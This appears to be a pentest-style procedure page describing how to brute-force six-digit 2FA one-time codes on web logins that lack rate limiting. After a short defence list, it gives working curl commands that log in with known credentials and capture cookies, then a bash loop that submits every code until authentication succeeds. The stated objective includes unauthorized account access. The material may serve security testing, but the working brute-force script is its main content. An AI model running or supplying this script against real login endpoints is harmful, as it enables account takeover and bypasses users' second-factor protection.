# Brute-Force-2FA-OTP-to-Bypass-Authentication

## Summary

This procedure exploits web applications lacking rate limiting or account lockout on 2FA OTP verification, allowing an attacker to brute-force the typically 6-digit code and bypass authentication to access user accounts.

## Description

In scenarios where 2FA is implemented via one-time passwords (OTP) sent via email or generated by apps like Google Authenticator, the absence of restrictions on failed attempts enables systematic guessing. The attack begins with a valid username/password to trigger OTP delivery, followed by rapid submissions of code variations (e.g., 000000 to 999999). Success grants full account access, potentially leading to data exfiltration or further compromise. This was observed in Cloudflare's login system, rated low severity due to the ~1 in 1,000,000 success rate per attempt but feasible with automation. Prerequisites include knowing the target's primary credentials and the OTP delivery method.

## Requirements

1. Valid target username and password to initiate login and trigger OTP
2. Network access to the web login endpoint (HTTPS typically)
3. Ability to intercept or simulate HTTP requests (e.g., via browser dev tools or scripting)

## Defense

Defensive measures and detection strategies:

- Implement rate limiting (e.g., max 5 attempts per hour per IP/account)
- Enforce progressive delays or temporary lockouts after failures
- Monitor for anomalous login patterns, such as high-volume OTP submissions from single IPs
- Use CAPTCHA or device fingerprinting post-failed attempts

## Objectives

1. Gain unauthorized access to protected accounts by guessing OTP
2. Demonstrate weakness in 2FA implementation
3. Highlight need for additional controls like hardware keys

## Instructions

### Step 1: Trigger OTP Generation

**Context**: Start the authentication flow to receive a legitimate OTP, which sets the session for verification attempts.

**Command** ([[commands/curl-trigger-otp]]):
```bash
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "target@example.com", "password": "knownpassword"}' \
  -c cookies.txt \
  -o initial_response.json
```

> This sends credentials to the login endpoint, capturing session cookies in cookies.txt. Expected output: JSON response with OTP delivery confirmation (e.g., {"status": "otp_sent"}). Check email/app for the real OTP if testing ethically.

### Step 2: Brute-Force OTP Submission

**Context**: Systematically submit OTP guesses using the captured session, exploiting no limits on failures.

**Command** ([[commands/curl-2fa-brute]]):
```bash
for otp in $(seq -w 0 999999); do
  curl -X POST https://target.com/api/verify-otp \
    -b cookies.txt \
    -H "Content-Type: application/json" \
    -d '{"otp": "'$otp'"}' \
    -o response_$otp.json \
    -s
  if grep -q '"authenticated": true' response_$otp.json; then
    echo "Success! OTP: $otp"
    cat response_$otp.json
    break
  fi
done
```

> This loops through padded 6-digit codes (000000-999999), submitting each via POST. Use -s for silent mode to speed up. Expected output on success: JSON with auth token (e.g., {"authenticated": true, "token": "eyJ..."}). Monitor for errors; success indicated by no lockout and eventual match.
